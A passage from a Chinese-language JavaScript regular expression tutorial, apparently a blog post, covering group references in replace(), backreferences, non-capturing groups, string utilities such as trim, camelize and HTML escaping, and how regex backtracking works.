&quot;2017-06-12&quot;;</span><br><span class="line">var result = string.replace(regex, &quot;$2/$3/$1&quot;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;06/12/2017&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中<code>replace</code>中的，第二个参数里用<code>$1</code>、<code>$2</code>、<code>$3</code>指代相应的分组。等价于如下的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/;</span><br><span class="line">var string = &quot;2017-06-12&quot;;</span><br><span class="line">var result = string.replace(regex, function() &#123;</span><br><span class="line">return RegExp.$2 + &quot;/&quot; + RegExp.$3 + &quot;/&quot; + RegExp.$1;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;06/12/2017&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>也等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/;</span><br><span class="line">var string = &quot;2017-06-12&quot;;</span><br><span class="line">var result = string.replace(regex, function(match, year, month, day) &#123;</span><br><span class="line">return month + &quot;/&quot; + day + &quot;/&quot; + year;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;06/12/2017&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h3 id="3-反向引用"><a href="#3-反向引用" class="headerlink" title="3. 反向引用"></a>3. 反向引用</h3><p>除了使用相应API来引用分组，也可以在正则本身里引用分组。但只能引用之前出现的分组，即反向引用。</p><p>还是以日期为例。</p><p>比如要写一个正则支持匹配如下三种格式：</p><blockquote><p>2016-06-12</p><p>2016/06/12</p><p>2016.06.12</p></blockquote><p>最先可能想到的正则是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d&#123;4&#125;(-|\/|\.)\d&#123;2&#125;(-|\/|\.)\d&#123;2&#125;/;</span><br><span class="line">var string1 = &quot;2017-06-12&quot;;</span><br><span class="line">var string2 = &quot;2017/06/12&quot;;</span><br><span class="line">var string3 = &quot;2017.06.12&quot;;</span><br><span class="line">var string4 = &quot;2016-06/12&quot;;</span><br><span class="line">console.log( regex.test(string1) ); // true</span><br><span class="line">console.log( regex.test(string2) ); // true</span><br><span class="line">console.log( regex.test(string3) ); // true</span><br><span class="line">console.log( regex.test(string4) ); // true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中<code>/</code>和<code>.</code>需要转义。虽然匹配了要求的情况，但也匹配”2016-06/12”这样的数据。</p><p>假设我们想要求分割符前后一致怎么办？此时需要使用反向引用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d&#123;4&#125;(-|\/|\.)\d&#123;2&#125;\1\d&#123;2&#125;/;</span><br><span class="line">var string1 = &quot;2017-06-12&quot;;</span><br><span class="line">var string2 = &quot;2017/06/12&quot;;</span><br><span class="line">var string3 = &quot;2017.06.12&quot;;</span><br><span class="line">var string4 = &quot;2016-06/12&quot;;</span><br><span class="line">console.log( regex.test(string1) ); // true</span><br><span class="line">console.log( regex.test(string2) ); // true</span><br><span class="line">console.log( regex.test(string3) ); // true</span><br><span class="line">console.log( regex.test(string4) ); // false</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>注意里面的<code>\1</code>，表示的引用之前的那个分组<code>(-|\/|\.)</code>。不管它匹配到什么（比如-），<code>\1</code>都匹配那个同样的具体某个字符。</p><p>我们知道了<code>\1</code>的含义后，那么<code>\2</code>和<code>\3</code>的概念也就理解了，即分别指代第二个和第三个分组。</p><p>看到这里，此时，恐怕你会有三个问题。</p><p><strong>3.1 括号嵌套怎么办？</strong></p><p>以左括号（开括号）为准。比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^((\d)(\d(\d)))\1\2\3\4$/;</span><br><span class="line">var string = &quot;1231231233&quot;;</span><br><span class="line">console.log( regex.test(string) ); // true</span><br><span class="line">console.log( RegExp.$1 ); // 123</span><br><span class="line">console.log( RegExp.$2 ); // 1</span><br><span class="line">console.log( RegExp.$3 ); // 23</span><br><span class="line">console.log( RegExp.$4 ); // 3</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>我们可以看看这个正则匹配模式：</p><ul><li>第一个字符是数字，比如说1，</li><li>第二个字符是数字，比如说2，</li><li>第三个字符是数字，比如说3，</li><li>接下来的是<code>\1</code>，是第一个分组内容，那么看第一个开括号对应的分组是什么，是123，</li><li>接下来的是<code>\2</code>，找到第2个开括号，对应的分组，匹配的内容是1，</li><li>接下来的是<code>\3</code>，找到第3个开括号，对应的分组，匹配的内容是23，</li><li>最后的是<code>\4</code>，找到第3个开括号，对应的分组，匹配的内容是3。</li></ul><p>这个问题，估计仔细看一下，就该明白了。</p><p><strong>3.2 \10表示什么呢？</strong></p><p>另外一个疑问可能是，即<code>\10</code>是表示第10个分组，还是<code>\1</code>和<code>0</code>呢？</p><p>答案是前者，虽然一个正则里出现<code>\10</code>比较罕见。测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(1)(2)(3)(4)(5)(6)(7)(8)(9)(#) \10+/;</span><br><span class="line">var string = &quot;123456789# ######&quot;</span><br><span class="line">console.log( regex.test(string) );</span><br><span class="line">// =&gt; true复制代码</span><br></pre></td></tr></table></figure><p><strong>3.3 引用不存在的分组会怎样？</strong></p><p>因为反向引用，是引用前面的分组，但我们在正则里引用了不存在的分组时，此时正则不会报错，只是匹配反向引用的字符本身。例如<code>\2</code>，就匹配”\2”。注意”\2”表示对”2”进行了转意。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\1\2\3\4\5\6\7\8\9/;</span><br><span class="line">console.log( regex.test(&quot;\1\2\3\4\5\6\7\8\9&quot;) ); </span><br><span class="line">console.log( &quot;\1\2\3\4\5\6\7\8\9&quot;.split(&quot;&quot;) );</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>chrome浏览器打印的结果：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/f75ad2642625466dd5adcad3e2a4c51a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="4-非捕获分组"><a href="#4-非捕获分组" class="headerlink" title="4. 非捕获分组"></a>4. 非捕获分组</h3><p>之前文中出现的分组，都会捕获它们匹配到的数据，以便后续引用，因此也称他们是捕获型分组。</p><p>如果只想要括号最原始的功能，但不会引用它，即，既不在API里引用，也不在正则里反向引用。此时可以使用非捕获分组<code>(?:p)</code>，例如本文第一个例子可以修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(?:ab)+/g;</span><br><span class="line">var string = &quot;ababa abbb ababab&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;abab&quot;, &quot;ab&quot;, &quot;ababab&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h3 id="5-相关案例"><a href="#5-相关案例" class="headerlink" title="5. 相关案例"></a>5. 相关案例</h3><p>至此括号的作用已经讲完了，总结一句话，就是提供了可供我们使用的分组，如何用就看我们的了。</p><p><strong>5.1 字符串trim方法模拟</strong></p><p><code>trim</code>方法是去掉字符串的开头和结尾的空白符。有两种思路去做。</p><p>第一种，匹配到开头和结尾的空白符，然后替换成空字符。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function trim(str) &#123;</span><br><span class="line">return str.replace(/^\s+|\s+$/g, &apos;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">console.log( trim(&quot;  foobar   &quot;) ); </span><br><span class="line">// =&gt; &quot;foobar&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>第二种，匹配整个字符串，然后用引用来提取出相应的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function trim(str) &#123;</span><br><span class="line">return str.replace(/^\s*(.*?)\s*$/g, &quot;$1&quot;);</span><br><span class="line">&#125;</span><br><span class="line">console.log( trim(&quot;  foobar   &quot;) ); </span><br><span class="line">// =&gt; &quot;foobar&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这里使用了惰性匹配<code>*?</code>，不然也会匹配最后一个空格之前的所有空格的。</p><p>当然，前者效率高。</p><p><strong>5.2 将每个单词的首字母转换为大写</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function titleize(str) &#123;</span><br><span class="line">return str.toLowerCase().replace(/(?:^|\s)\w/g, function(c) &#123;</span><br><span class="line">return c.toUpperCase();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">console.log( titleize(&apos;my name is epeli&apos;) ); </span><br><span class="line">// =&gt; &quot;My Name Is Epeli&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>思路是找到每个单词的首字母，当然这里不使用非捕获匹配也是可以的。</p><p><strong>5.3 驼峰化</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function camelize(str) &#123;</span><br><span class="line">return str.replace(/[-_\s]+(.)?/g, function(match, c) &#123;</span><br><span class="line">return c ? c.toUpperCase() : &apos;&apos;;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">console.log( camelize(&apos;-moz-transform&apos;) ); </span><br><span class="line">// =&gt; &quot;MozTransform&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中分组<code>(.)</code>表示首字母。单词的界定是，前面的字符可以是多个连字符、下划线以及空白符。正则后面的?的目的，是为了应对<code>str</code>尾部的字符可能不是单词字符，比如<code>str</code>是’-moz-transform    ‘。</p><p><strong>5.4 中划线化</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function dasherize(str) &#123;</span><br><span class="line">return str.replace(/([A-Z])/g, &apos;-$1&apos;).replace(/[-_\s]+/g, &apos;-&apos;).toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line">console.log( dasherize(&apos;MozTransform&apos;) ); </span><br><span class="line">// =&gt; &quot;-moz-transform&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>驼峰化的逆过程。</p><p><strong>5.5 html转义和反转义</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 将HTML特殊字符转换成等值的实体</span><br><span class="line">function escapeHTML(str) &#123;</span><br><span class="line">var escapeChars = &#123;</span><br><span class="line">  &apos;¢&apos; : &apos;cent&apos;,</span><br><span class="line">  &apos;£&apos; : &apos;pound&apos;,</span><br><span class="line">  &apos;¥&apos; : &apos;yen&apos;,</span><br><span class="line">  &apos;€&apos;: &apos;euro&apos;,</span><br><span class="line">  &apos;©&apos; :&apos;copy&apos;,</span><br><span class="line">  &apos;®&apos; : &apos;reg&apos;,</span><br><span class="line">  &apos;&lt;&apos; : &apos;lt&apos;,</span><br><span class="line">  &apos;&gt;&apos; : &apos;gt&apos;,</span><br><span class="line">  &apos;&quot;&apos; : &apos;quot&apos;,</span><br><span class="line">  &apos;&amp;&apos; : &apos;amp&apos;,</span><br><span class="line">  &apos;\&apos;&apos; : &apos;#39&apos;</span><br><span class="line">&#125;;</span><br><span class="line">return str.replace(new RegExp(&apos;[&apos; + Object.keys(escapeChars).join(&apos;&apos;) +&apos;]&apos;, &apos;g&apos;), function(match) &#123;</span><br><span class="line">return &apos;&amp;&apos; + escapeChars[match] + &apos;;&apos;;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">console.log( escapeHTML(&apos;&lt;div&gt;Blah blah blah&lt;/div&gt;&apos;) );</span><br><span class="line">// =&gt; &quot;&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt&quot;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中使用了用构造函数生成的正则，然后替换相应的格式就行了，这个跟本章没多大关系。</p><p>倒是它的逆过程，使用了括号，以便提供引用，也很简单，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 实体字符转换为等值的HTML。</span><br><span class="line">function unescapeHTML(str) &#123;</span><br><span class="line">var htmlEntities = &#123;</span><br><span class="line">  nbsp: &apos; &apos;,</span><br><span class="line">  cent: &apos;¢&apos;,</span><br><span class="line">  pound: &apos;£&apos;,</span><br><span class="line">  yen: &apos;¥&apos;,</span><br><span class="line">  euro: &apos;€&apos;,</span><br><span class="line">  copy: &apos;©&apos;,</span><br><span class="line">  reg: &apos;®&apos;,</span><br><span class="line">  lt: &apos;&lt;&apos;,</span><br><span class="line">  gt: &apos;&gt;&apos;,</span><br><span class="line">  quot: &apos;&quot;&apos;,</span><br><span class="line">  amp: &apos;&amp;&apos;,</span><br><span class="line">  apos: &apos;\&apos;&apos;</span><br><span class="line">&#125;;</span><br><span class="line">return str.replace(/\&amp;([^;]+);/g, function(match, key) &#123;</span><br><span class="line">if (key in htmlEntities) &#123;</span><br><span class="line">return htmlEntities[key];</span><br><span class="line">&#125;</span><br><span class="line">return match;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">console.log( unescapeHTML(&apos;&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt;&apos;) );</span><br><span class="line">// =&gt; &quot;&lt;div&gt;Blah blah blah&lt;/div&gt;&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>通过<code>key</code>获取相应的分组引用，然后作为对象的键。</p><p><strong>5.6 匹配成对标签</strong></p><p>要求匹配：</p><blockquote><title>regular expression</title><p>laoyao bye bye</p></blockquote><p>不匹配：</p><blockquote><p><title>wrong!</title></p><p></p></blockquote><p>匹配一个开标签，可以使用正则<code>&lt;[^&gt;]+&gt;</code>，</p><p>匹配一个闭标签，可以使用<code>&lt;\/[^&gt;]+&gt;</code>，</p><p>但是要求匹配成对标签，那就需要使用反向引用，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var regex = /&lt;([^&gt;]+)&gt;[\d\D]*&lt;\/\1&gt;/;</span><br><span class="line">var string1 = &quot;&lt;title&gt;regular expression&lt;/title&gt;&quot;;</span><br><span class="line">var string2 = &quot;&lt;p&gt;laoyao bye bye&lt;/p&gt;&quot;;</span><br><span class="line">var string3 = &quot;&lt;title&gt;wrong!&lt;/p&gt;&quot;;</span><br><span class="line">console.log( regex.test(string1) ); // true</span><br><span class="line">console.log( regex.test(string2) ); // true</span><br><span class="line">console.log( regex.test(string3) ); // false</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中开标签<code>&lt;[^&gt;]+&gt;</code>改成<code>&lt;([^&gt;]+)&gt;</code>，使用括号的目的是为了后面使用反向引用，而提供分组。闭标签使用了反向引用，<code>&lt;\/\1&gt;</code>。</p><p>另外<code>[\d\D]</code>的意思是，这个字符是数字或者不是数字，因此，也就是匹配任意字符的意思。</p><h3 id="第三章小结"><a href="#第三章小结" class="headerlink" title="第三章小结"></a>第三章小结</h3><p>正则中使用括号的例子那可是太多了，不一而足。</p><p>重点理解括号可以提供分组，我们可以提取数据，应该就可以了。</p><p>例子中的代码，基本没做多少分析，相信你都能看懂的。</p><h2 id="第4章-正则表达式回溯法原理"><a href="#第4章-正则表达式回溯法原理" class="headerlink" title="第4章 正则表达式回溯法原理"></a>第4章 正则表达式回溯法原理</h2><p>学习正则表达式，是需要懂点儿匹配原理的。</p><p>而研究匹配原理时，有两个字出现的频率比较高：“回溯”。</p><p>听起来挺高大上，确实还有很多人对此不明不白的。</p><p>因此，本章就简单扼要地说清楚回溯到底是什么东西。</p><p>内容包括：</p><ol><li>没有回溯的匹配</li><li>有回溯的匹配</li><li>常见的回溯形式</li></ol><h3 id="1-没有回溯的匹配"><a href="#1-没有回溯的匹配" class="headerlink" title="1. 没有回溯的匹配"></a>1. 没有回溯的匹配</h3><p>假设我们的正则是<code>/ab{1,3}c/</code>，其可视化形式是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/d92077b25d4faf8073d38999294f746c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>而当目标字符串是”abbbc”时，就没有所谓的“回溯”。其匹配过程是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/3f6e829c62fca181d818205e0e08bf73?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>其中子表达式<code>b{1,3}</code>表示“b”字符连续出现1到3次。</p><h3 id="2-有回溯的匹配"><a href="#2-有回溯的匹配" class="headerlink" title="2. 有回溯的匹配"></a>2. 有回溯的匹配</h3><p>如果目标字符串是”abbc”，中间就有回溯。</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/e58356622f6087437f33cdce7ce7bd3d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>图中第5步有红颜色，表示匹配不成功。此时<code>b{1,3}</code>已经匹配到了2个字符“b”，准备尝试第三个时，结果发现接下来的字符是“c”。那么就认为<code>b{1,3}</code>就已经匹配完毕。然后状态又回到之前的状态（即第6步，与第4步一样），最后再用子表达式<code>c</code>，去匹配字符“c”。当然，此时整个表达式匹配成功了。</p><p>图中的第6步，就是“回溯”。</p><p>你可能对此没有感觉，这里我们再举一个例子。正则是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/12da8829af2cb1d67ea78631d58be6ce?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>目标字符串是”abbbc”，匹配过程是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/dddfffaf633dd14c4eefba488f64400f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>其中第7步和第10步是回溯。第7步与第4步一样，此时<code>b{1,3}</code>匹配了两个”b”，而第10步与第3步一样，此时<code>b{1,3}</code>只匹配了一个”b”，这也是<code>b{1,3}</code>的最终匹配结果。</p><p>这里再看一个清晰的回溯，正则是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/a9e420776eb01c07979f1599e4060775?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>目标字符串是：”acd”ef，匹配过程是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/33b738b42fc9e74edc84b17479ac7000?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>图中省略了尝试匹配双引号失败的过程。可以看出<code>.*</code>是非常影响效率的。</p><p>为了减少一些不必要的回溯，可以把正则修改为<code>/&quot;[^&quot;]*&quot;/</code>。</p><h3 id="3-常见的回溯形式"><a href="#3-常见的回溯形式" class="headerlink" title="3. 常见的回溯形式"></a>3. 常见的回溯形式</h3><p>正则表达式匹配字符串的这种方式，有个学名，叫回溯法。</p><p>回溯法也称试探法，它的基本思想是：从问题的某一种状态（初始状态）出发，搜索从这种状态出发所能达到的所有“状态”，当一条路走到“尽头”的时候（不能再前进），再后退一步或若干步，从另一种可能“状态”出发，继续搜索，直到所有的“路径”（状态）都试探过。这种不断“前进”、不断“回溯”寻找解的方法，就称作“回溯法”。（copy于百度百科）。</p><p>本质上就是深度优先搜索算法。<strong>其中退到之前的某一步这一过程，我们称为“回溯”。</strong>从上面的描述过程中，可以看出，路走不通时，就会发生“回溯”。即，<strong>尝试匹配失败时，接下来的一步通常就是回溯。</strong></p><p>道理，我们是懂了。那么JS中正则表达式会产生回溯的地方都有哪些呢？</p><p><strong>3.1 贪婪量词</strong></p><p>之前的例子都是贪婪量词相关的。比如<code>b{1,3}</code>，因为其是贪婪的，尝试可能的顺序是从多往少的方向去尝试。首先会尝试”bbb”，然后再看整个正则是否能匹配。不能匹配时，吐出一个”b”，即在”bb”的基础上，再继续尝试。如果还不行，再吐出一个，再试。如果还不行呢？只能说明匹配失败了。</p><p>虽然局部匹配是贪婪的，但也要满足整体能正确匹配。否则，皮之不存，毛将焉附？</p><p>此时我们不禁会问，如果当多个贪婪量词挨着存在，并相互有冲突时，此时会是怎样？</p><p>答案是，先下手为强！因为深度优先搜索。测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;12345&quot;;</span><br><span class="line">var regex = /(\d&#123;1,3&#125;)(\d&#123;1,3&#125;)/;</span><br><span class="line">console.log( string.match(regex) );</span><br><span class="line">// =&gt; [&quot;12345&quot;, &quot;123&quot;, &quot;45&quot;, index: 0, input: &quot;12345&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中，前面的<code>\d{1,3}</code>匹配的是”123”，后面的<code>\d{1,3}</code>匹配的是”45”。</p><p><strong>3.2 惰性量词</strong></p><p>惰性量词就是在贪婪量词后面加个问号。表示尽可能少的匹配，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;12345&quot;;</span><br><span class="line">var regex = /(\d&#123;1,3&#125;?)(\d&#123;1,3&#125;)/;</span><br><span class="line">console.log( string.match(regex) );</span><br><span class="line">// =&gt; [&quot;1234&quot;, &quot;1&quot;, &quot;234&quot;, index: 0, input: &quot;12345&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中<code>\d{1,3}?</code>只匹配到一个字符”1”，而后面的<code>\d{1,3}</code>匹配了”234”。</p><p>虽然惰性量词不贪，但也会有回溯的现象。比如正则是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/0e29c26dd50349760d05935c5e93f07b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>目标字符串是”12345”，匹配过程是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/a2af73fc275cddf7c9c5fb5a786861c0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>知道你不贪、很知足，但是为了整体匹配成，没办法，也只能给你多塞点了。因此最后<code>\d{1,3}?</code>匹配的字符是”12”，是两个数字，而不是一个。</p><p>3.3 <strong>分支结构</strong></p><p>我们知道分支也是惰性的，比如<code>/can|candy/</code>，去匹配字符串”candy”，得到的结果是”can”，因为分支会一个一个尝试，如果前面的满足了，后面就不会再试验了。</p><p>分支结构，可能前面的子模式会形成了局部匹配，如果接下来表达式整体不匹配时，仍会继续尝试剩下的分支。这种尝试也可以看成一种回溯。</p><p>比如正则：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/4aedaeda72a6d291b9a8685cc0170347?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>目标字符串是”candy”，匹配过程：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/d69d02dfe0712ee3d22d5bb1afcda0a2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>上面第5步，虽然没有回到之前的状态，但仍然回到了分支结构，尝试下一种可能。所以，可以认为它是一种回溯的。</p><h3 id="第四章小结"><a href="#第四章小结" class="headerlink" title="第四章小结"></a>第四章小结</h3><p>其实回溯法，很容易掌握的。</p><p>简单总结就是，正因为有多种可能，所以要一个一个试。直到，要么到某一步时，整体匹配成功了；要么最后都试完后，发现整体匹配不成功。</p><ol><li>贪婪量词“试”的策略是：买衣服砍价。价钱太高了，便宜点，不行，再便宜点。</li><li>惰性量词“试”的策略是：卖东西加价。给少了，再多给点行不，还有点少啊，再给点。</li><li>分支结构“试”的策略是：货比三家。这家不行，换一家吧，还不行，再换。</li></ol><p>既然有回溯的过程，那么匹配效率肯定低一些。相对谁呢？相对那些DFA引擎。</p><p>而JS的正则引擎是NFA，NFA是“非确定型有限自动机”的简写。</p><p>大部分语言中的正则都是NFA，为啥它这么流行呢？</p><p>答：你别看我匹配慢，但是我编译快啊，而且我还有趣哦。</p><h2 id="第5章-正则表达式的拆分"><a href="#第5章-正则表达式的拆分" class="headerlink" title="第5章 正则表达式的拆分"></a>第5章 正则表达式的拆分</h2><p>对于一门语言的掌握程度怎么样，可以有两个角度来衡量：读和写。</p><p>不仅要求自己能解决问题，还要看懂别人的解决方案。代码是这样，正则表达式也是这样。</p><p>正则这门语言跟其他语言有一点不同，它通常就是一大堆字符，而没有所谓“语句”的概念。</p><p>如何能正确地把一大串正则拆分成一块一块的，成为了破解“天书”的关键。</p><p>本章就解决这一问题，内容包括：</p><ol><li>结构和操作符</li><li>注意要点</li><li>案例分析</li></ol><h3 id="1-结构和操作符"><a href="#1-结构和操作符" class="headerlink" title="1. 结构和操作符"></a>1. 结构和操作符</h3><p>编程语言一般都有操作符。只要有操作符，就会出现一个问题。当一大堆操作在一起时，先操作谁，又后操作谁呢？为了不产生歧义，就需要语言本身定义好操作顺序，即所谓的优先级。</p><p>而在正则表达式中，操作符都体现在结构中，即由特殊字符和普通字符所代表的一个个特殊整体。</p><p>JS正则表达式中，都有哪些结构呢？</p><blockquote><p>字符字面量、字符组、量词、锚字符、分组、选择分支、反向引用。</p></blockquote><p>具体含义简要回顾如下（如懂，可以略去不看）：</p><blockquote><p><strong>字面量</strong>，匹配一个具体字符，包括不用转义的和需要转义的。比如a匹配字符”a”，又比如<code>\n</code>匹配换行符，又比如<code>\.</code>匹配小数点。</p><p><strong>字符组</strong>，匹配一个字符，可以是多种可能之一，比如<code>[0-9]</code>，表示匹配一个数字。也有<code>\d</code>的简写形式。另外还有反义字符组，表示可以是除了特定字符之外任何一个字符，比如<code>[^0-9]</code>，表示一个非数字字符，也有<code>\D</code>的简写形式。</p><p><strong>量词</strong>，表示一个字符连续出现，比如<code>a{1,3}</code>表示“a”字符连续出现3次。另外还有常见的简写形式，比如<code>a+</code>表示“a”字符连续出现至少一次。</p><p><strong>锚点</strong>，匹配一个位置，而不是字符。比如^匹配字符串的开头，又比如<code>\b</code>匹配单词边界，又比如<code>(?=\d)</code>表示数字前面的位置。</p><p><strong>分组</strong>，用括号表示一个整体，比如<code>(ab)+</code>，表示”a